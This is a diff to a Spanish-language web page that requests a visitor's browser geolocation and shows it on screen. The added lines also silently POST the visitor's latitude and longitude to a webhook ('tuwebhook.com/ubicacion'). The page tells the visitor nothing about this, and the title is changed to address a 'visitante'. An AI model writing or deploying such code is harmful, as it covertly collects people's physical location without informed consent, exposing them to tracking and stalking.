@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Ubicación del Usuario</title>
+    <title>Ubicación del visitante</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
@@ -19,6 +19,7 @@
                     function(posicion) {
                         const lat = posicion.coords.latitude;
                         const lon = posicion.coords.longitude;
+
                         resultado.innerHTML = `
                             Tu ubicación es:<br>
                             Latitud: ${lat}<br>
@@ -27,12 +28,19 @@
                                 Ver en Google Maps
                             </a>
                         `;
+
+                        // 🔄 Enviar ubicación a tu servidor o webhook
+                        fetch("https://tuwebhook.com/ubicacion", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ latitud: lat, longitud: lon })
+                        });
                     },
                     function(error) {
                         const mensajes = {
                             1: "El usuario negó el permiso de ubicación.",
                             2: "La información de ubicación no está disponible.",
-                            3: "La solicitud de ubicación expiró."
+                            3: "La solicitud de ubicación expiró.",
                         };
                         resultado.innerHTML = mensajes[error.code] || "Ocurrió un error desconocido.";
                     }
